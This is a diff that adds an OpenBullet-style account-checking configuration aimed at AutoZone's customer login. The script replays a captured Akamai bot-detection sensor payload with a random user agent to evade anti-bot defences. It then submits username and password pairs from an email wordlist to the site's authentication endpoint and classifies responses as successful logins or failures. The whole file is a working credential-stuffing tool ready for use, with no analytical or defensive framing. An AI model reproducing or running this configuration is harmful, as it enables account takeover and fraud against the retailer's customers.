@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "AutoZone",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-22T13:48:05.6303216-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Her",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Email",
+  "AllowedWordlist2": "Email",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "UA" 
+
+REQUEST POST "https://www.autozone.com/public/e846f45f22396559af9f26d461f89" 
+  CONTENT "{\"sensor_data\":\"7a74G7m23Vrp0o5c9168811.54-1,2,-94,-100,<UA>,uaend,11059,20100101,en-US,Gecko,0,0,0,0,391223,4335933,1920,1007,1920,1080,1300,896,1920,,cpen:0,i1:0,dm:0,cwen:0,non:1,opc:0,fc:1,sc:0,wrc:1,isc:138,vib:1,bat:0,x11:0,x12:1,5583,0.293899783146,795017167966,loc:-1,2,-94,-101,do_en,dm_en,t_dis-1,2,-94,-105,0,-1,1,0,913,864,0;1,0,0,0,932,883,0;0,-1,0,0,520,1315,0;0,-1,0,0,933,933,0;0,0,0,0,937,937,0;0,0,0,0,821,821,0;0,0,0,0,806,520,0;1,0,0,0,883,883,0;1,0,0,0,1728,1728,0;0,0,0,0,388,388,0;0,0,0,0,538,538,0;0,0,0,0,113,1051,0;0,-1,1,0,1010,-1,0;-1,2,-94,-102,0,-1,1,0,913,864,0;1,0,0,0,932,883,0;0,-1,0,0,520,1315,0;0,-1,0,0,933,933,0;0,0,0,0,937,937,0;0,0,0,0,821,821,0;0,0,0,0,806,520,0;1,0,0,0,883,883,0;1,0,0,0,1728,1728,0;0,0,0,0,388,388,0;0,0,0,0,538,538,0;0,0,0,0,113,1051,0;0,-1,1,0,1010,-1,0;-1,2,-94,-108,-1,2,-94,-110,-1,2,-94,-117,-1,2,-94,-111,-1,2,-94,-109,-1,2,-94,-114,-1,2,-94,-103,-1,2,-94,-112,https://www.autozone.com/myzone/profile/login.jsp?redirectURL=%2F-1,2,-94,-115,1,32,32,0,0,0,0,5,0,1590034335932,-999999,17009,0,0,2834,0,0,8,0,0,641ACF0B45AAF3375DF0DB42E29B1B9A~-1~YAAQDOpNFy+pUzNyAQAAjIFuNQPtZIXVA8niEMJ3bud4+YIIw6iRigqZZsgJcjc8qGss8O+oTw1t0Mb7kWVlMX4QAAQXyhlDYKmiljo4LMgT43pOjpy3R5pyy2XU38+1Y1TwfypLg3+8O2PqKPXkVnVvRIWB8Qyfpx47F37eRodYSdeqQiLKTg2otYoxflu2CKzRPbrgT3b89bQBuBdoiLs9JxYll61D5kKwJ7q0hyUAfCYp5c+vzCvWFltPMPimP7e0/G2XKK4IODkLkHfYWwF2Ma2hcWhx6W/S1sGE2bfMfKjRib+w00DFmh4=~-1~-1~-1,29805,-1,-1,26067385-1,2,-94,-106,0,0-1,2,-94,-119,-1-1,2,-94,-122,0,0,0,0,1,0,0-1,2,-94,-123,-1,2,-94,-124,-1,2,-94,-126,-1,2,-94,-127,-1,2,-94,-70,-1-1,2,-94,-80,94-1,2,-94,-116,4335937-1,2,-94,-118,99118-1,2,-94,-121,;6;-1;0\"}" 
+  CONTENTTYPE "text/plain" 
+  HEADER "Host: www.autozone.com" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: text/plain;charset=UTF-8" 
+  HEADER "Origin: https://www.autozone.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.autozone.com/myzone/profile/login.jsp?redirectURL=%2F" 
+
+REQUEST POST "https://www.autozone.com/rest/bean/atg/userprofiling/ProfileServices/authentication?atg-rest-depth=2" 
+  CONTENT "arg1=<USER>&arg2=<PASS>&desktopReq=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.autozone.com" 
+  HEADER "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://www.autozone.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.autozone.com/myzone/profile/login.jsp?redirectURL=%2F" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "GUEST" 
+  KEYCHAIN Success OR 
+    KEY "MYZONE_LOYALTY_LINK_COMPLETED" 
+    KEY "/myzone/loggedIn.jsp" 
+
